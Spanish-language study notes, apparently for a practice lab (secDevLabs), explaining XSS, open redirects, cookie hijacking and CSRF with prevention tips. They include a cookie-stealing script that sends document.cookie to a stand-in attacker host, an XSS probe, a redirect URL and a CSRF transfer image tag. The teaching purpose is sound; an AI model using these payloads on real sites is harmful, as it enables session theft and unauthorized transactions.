
Utilizaremos el siguiente directorio para tener entorno controlado
https://github.com/globocom/secDevLabs
lo clonamos
	realizamos
			make install

Se puede empezar probando si es suceptible a XSS
mediante generar alertas
Se pueden hacer redireccionamientos, klgr en la pagina web, Cookie Hijaking, incluso si el csrf token no es dinamico se puede hijackear

#### **1. Cross-Site Scripting (XSS)**

El **XSS** es una vulnerabilidad en la que un atacante puede inyectar scripts maliciosos en las páginas vistas por otros usuarios. Esto ocurre cuando una aplicación web no valida o limpia correctamente las entradas del usuario, lo que permite la ejecución de código JavaScript.

##### **Ejemplo básico de XSS:**

Puedes probar si una aplicación es vulnerable a XSS generando una alerta de JavaScript:

html


`<script>alert('XSS vulnerability!');</script>`

Si al ingresar este código en un campo de formulario, URL, o parámetro de búsqueda en la web, ves que la alerta aparece, entonces la aplicación es vulnerable a XSS.

#### **Tipos de XSS:**

1. **Reflejado (Reflected XSS)**: El script malicioso se refleja de inmediato en la página (por ejemplo, mediante la URL).
    
2. **Almacenado (Stored XSS)**: El script malicioso se almacena en el servidor y se sirve a los usuarios que acceden a esa página.
    

---

#### **2. Redireccionamientos Inseguros**

Los **redireccionamientos inseguros** son una vulnerabilidad donde una aplicación web redirige a los usuarios a una URL externa no confiable. Esto puede ser aprovechado para hacer phishing u otras acciones maliciosas.

##### **Ejemplo:**

Si una aplicación permite un parámetro de URL como `redirect_url`, un atacante puede intentar redirigir a los usuarios a un sitio malicioso:

bash



`http://vulnerable-site.com/redirect?url=http://malicious-site.com`

El servidor debería verificar que la URL de destino esté en una lista blanca de dominios confiables antes de redirigir.

---

#### **3. Cookie Hijacking**

El **Cookie Hijacking** ocurre cuando un atacante roba cookies de sesión para suplantar a un usuario legítimo. Esto puede suceder si las cookies no están correctamente aseguradas (por ejemplo, no se usan los flags `HttpOnly`, `Secure`).

##### **Ejemplo de Robo de Cookies:**

Un atacante puede inyectar un script que robe la cookie y la envíe a un servidor controlado por él:

javascript

CopiarEditar

`document.location = "http://attacker.com?cookie=" + document.cookie;`

**Prevención:**

- Usar las banderas `HttpOnly` (para que la cookie no sea accesible desde JavaScript) y `Secure` (para asegurar que solo se envíen a través de HTTPS).
    
- Asegurarse de que las cookies tengan un dominio y una ruta bien definidos.
    

---

#### **4. CSRF (Cross-Site Request Forgery) Hijacking**

El **CSRF** es un ataque en el que un atacante induce a un usuario autenticado a realizar acciones no deseadas en una aplicación web. Si un atacante puede hacer que el usuario ejecute una solicitud maliciosa mientras está autenticado (por ejemplo, al hacer clic en un enlace o cargar una imagen en su navegador), puede comprometer la seguridad.

##### **Ejemplo de ataque CSRF (sin token CSRF dinámico):**

Un atacante puede generar un enlace malicioso para transferir dinero de la cuenta de la víctima a la suya, utilizando el mismo navegador en el que la víctima está autenticada:

html

CopiarEditar

`<img src="http://victim-website.com/transfer?amount=1000&to=attackerAccount">`

Si el sitio web no valida adecuadamente los tokens CSRF y no genera uno único por sesión, el atacante podría hacer que el usuario realice una acción sin saberlo.

**Prevención:**

- Usar tokens CSRF dinámicos en cada solicitud (un token único por sesión que debe ser enviado con cada solicitud POST).
    
- Validar que las solicitudes provengan de la misma fuente (mediante cabeceras `SameSite` para las cookies).
    

---

### **Resumen de Prevención General:**

- **XSS:** Validar y sanitizar las entradas de los usuarios.
    
- **Redireccionamientos inseguros:** Validar las URLs de redirección.
    
- **Cookie Hijacking:** Usar cookies seguras (`HttpOnly`, `Secure`), y asegurarse de que la aplicación se ejecute solo sobre HTTPS.
    
- **CSRF:** Implementar tokens CSRF dinámicos y verificar la fuente de las solicitudes.


